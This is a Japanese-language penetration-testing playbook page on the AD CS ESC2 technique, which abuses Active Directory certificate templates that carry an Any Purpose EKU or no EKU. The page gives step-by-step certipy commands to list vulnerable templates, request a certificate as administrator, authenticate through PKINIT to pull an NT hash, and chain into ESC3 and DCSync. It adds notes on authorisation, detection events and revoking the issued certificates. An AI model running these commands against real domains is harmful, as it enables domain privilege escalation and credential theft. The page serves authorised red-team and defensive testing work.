# ESC2 — Any Purpose EKU / SubCA テンプレート

> **スコープ**: AD CS テンプレートの EKU が "Any Purpose" または "なし（SubCA）" の場合に、直接 PKINIT（経路A）または ESC3 チェーンとして Enrollment Agent 証明書を取得（経路B）する。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（ESC3 チェーンを経て任意ユーザーの証明書発行につながる）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- 対象テンプレートに `[!] Vulnerabilities: ESC2` が表示されている
- または `Any Purpose: True`（または EKU フィールドが空 = SubCA 相当）/ `Requires Manager Approval: False` / `Authorized Signatures Required: 0` / 低権限グループの Enrollment 権限 — の条件が手動で確認できる

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`）
- 必要な権限: 対象テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）

## 先に確認すること

**ESC2 の2つの悪用経路:**

| 経路 | 条件 | 概要 |
|------|------|------|
| **経路A**: 直接 PKINIT 認証 | Enrollee Supplies Subject が True、または CA に ESC6 フラグあり | ESC1 と同様に `-upn [TARGET]` で管理者証明書を申請 |
| **経路B**: ESC3 第1ステップ | Enrollment Agent として使える Any Purpose 証明書を取得 | この証明書を使い、別テンプレートで任意ユーザーの証明書を代理申請 |

まず Certipy の出力で `Enrollee Supplies Subject` を確認し、True であれば経路A（直接悪用）を先に試す。

**攻撃者の思考トレース:** EKU が「Any Purpose」または「なし（SubCA）」であれば、その証明書は Client Authentication にも Enrollment Agent にも使える。状況によって経路A（直接 PKINIT）と経路B（ESC3 チェーン）を使い分ける。

---

## 1. ESC2 条件確認

**コマンド:**

```bash
# [Attacker] 脆弱テンプレートの列挙
certipy find -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -vulnerable -stdout
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ESC2` が表示 + `Enrollee Supplies Subject: True` | 経路A が使える | §2 経路A へ |
| `ESC2` が表示 + `Enrollee Supplies Subject: False` | 経路Bのみ | §3 経路B へ |

---

## 2. 経路A — Enrollee Supplies Subject が True の場合（直接悪用）

ESC1 と同じ手順で `-upn` で任意の UPN を指定して証明書を申請する。

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**コマンド:**

```bash
# [Attacker] 任意 UPN で証明書申請
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -upn administrator@[DOMAIN]
# → administrator.pfx が生成される

# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

詳細フロー → `ESC1.md`（§3・§4 と同一）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| NT ハッシュが出力される | 経路A 成功 | DCSync → `../Credential_Dumping.md` |
| `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` | Enrollee Supplies Subject が実際には False | 経路B（§3）へ |

---

## 3. 経路B — Enrollment Agent 証明書として取得し ESC3 チェーンへ

**コマンド:**

```bash
# [Attacker] Any Purpose 証明書を Enrollment Agent として取得
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP]
# → [USER].pfx が生成される（Enrollment Agent 証明書として機能）
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `.pfx` ファイルが生成される | Enrollment Agent 証明書取得成功 | この pfx を使って ESC3 の Step 2 へ → `ESC3.md` |

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| 経路B で ESC3 に進んだが失敗する | ESC3 の前提条件を `Overview.md` で再確認する |
| Any Purpose テンプレートが見当たらない | EKU なし（SubCA 相当）テンプレートも ESC2 に該当。`Extended Key Usage` が空のテンプレートを探す |

---

## 注意点・落とし穴

- ESC2 単体では悪用できないケースがある: `Enrollee Supplies Subject` が False かつ CA に ESC6 フラグがなければ、ESC2 の証明書は直接 PKINIT に使えない。その場合は ESC3 チェーン（経路B）として評価する

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ESC3 チェーンを経た任意ユーザー証明書発行はドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書発行）/ 4768（TGT 要求）
- **業務影響リスク**: 証明書発行自体は業務影響なし
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 後（経路A）：直接 PKINIT → NT ハッシュ取得の詳細手順 → `ESC1.md`
- 後（経路B）：Enrollment Agent 証明書を使った代理申請 → `ESC3.md`
- 後：証明書取得後 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
